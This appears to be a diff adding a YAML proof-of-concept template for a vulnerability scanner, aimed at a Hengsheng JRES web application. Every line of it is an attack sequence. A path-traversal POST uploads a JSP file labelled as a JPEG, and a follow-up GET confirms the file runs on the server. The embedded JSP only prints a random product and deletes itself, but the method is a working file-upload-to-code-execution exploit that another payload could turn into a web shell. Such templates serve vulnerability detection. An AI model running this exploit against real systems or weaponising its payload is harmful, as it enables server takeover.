@@ -1,0 +1,27 @@
+name: poc-yaml-hengsheng-jres
+manual: true
+transport: http
+set:
+    filename: randomLowercase(6)
+    s1: randomInt(1000, 1500)
+    s2: randomInt(1000, 1500)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /acm/api/v1/../../see/view/uploadImage.json
+            headers:
+                Content-Type: multipart/form-data; boundary=59d81e90b0e121253e217b7bf32e48a1
+            body: "--59d81e90b0e121253e217b7bf32e48a1\r\nContent-Disposition: form-data; name=\"fileName\"\r\n\r\n{{filename}}.jsp\r\n--59d81e90b0e121253e217b7bf32e48a1\r\nContent-Disposition: form-data; name=\"fileUrl\"\r\n\r\n/\r\n--59d81e90b0e121253e217b7bf32e48a1\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{filename}}.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--59d81e90b0e121253e217b7bf32e48a1-- "
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.icontains("\"status\":") && response.body_string.icontains("\"url\":")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /acm/api/v1/../../{{filename}}.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
+expression: r0() && r1()
+detail: {}
